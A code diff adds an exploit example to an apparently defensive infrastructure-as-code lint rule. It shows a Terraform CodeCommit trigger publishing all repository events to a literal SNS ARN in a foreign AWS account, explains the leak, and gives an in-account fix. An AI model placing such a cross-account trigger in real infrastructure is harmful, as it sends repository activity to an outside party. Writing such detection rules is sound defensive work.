@@ -24,6 +24,38 @@ RULE = Rule(
         "source). A trigger whose destination lives in another account "
         "leaks repository activity outside the trust boundary."
     ),
+    exploit_example=(
+        "# Vulnerable: a CodeCommit trigger publishes every repo event\n"
+        "# to a literal SNS ARN in a different AWS account (note the\n"
+        "# account id 999988887777).\n"
+        "resource \"aws_codecommit_trigger\" \"events\" {\n"
+        "  repository_name = aws_codecommit_repository.app.repository_name\n"
+        "  trigger {\n"
+        "    name            = \"on-push\"\n"
+        "    events          = [\"all\"]\n"
+        "    destination_arn = \"arn:aws:sns:us-east-1:999988887777:repo-events\"\n"
+        "  }\n"
+        "}\n"
+        "\n"
+        "# Attack: every push, branch, and tag now publishes the repo\n"
+        "# event (commit ids, refs, repo name) to a topic the attacker\n"
+        "# controls in 999988887777, outside your account's trust\n"
+        "# boundary and CloudTrail. If that topic fans out to a Lambda,\n"
+        "# the foreign account also gets a code-execution hook on your\n"
+        "# source activity.\n"
+        "\n"
+        "# Safe: reference an in-account destination by its Terraform\n"
+        "# attribute, so the ARN can't silently point at a foreign\n"
+        "# account and it tracks a resource you own.\n"
+        "resource \"aws_codecommit_trigger\" \"events\" {\n"
+        "  repository_name = aws_codecommit_repository.app.repository_name\n"
+        "  trigger {\n"
+        "    name            = \"on-push\"\n"
+        "    events          = [\"all\"]\n"
+        "    destination_arn = aws_sns_topic.repo_events.arn\n"
+        "  }\n"
+        "}"
+    ),
 )
 
 
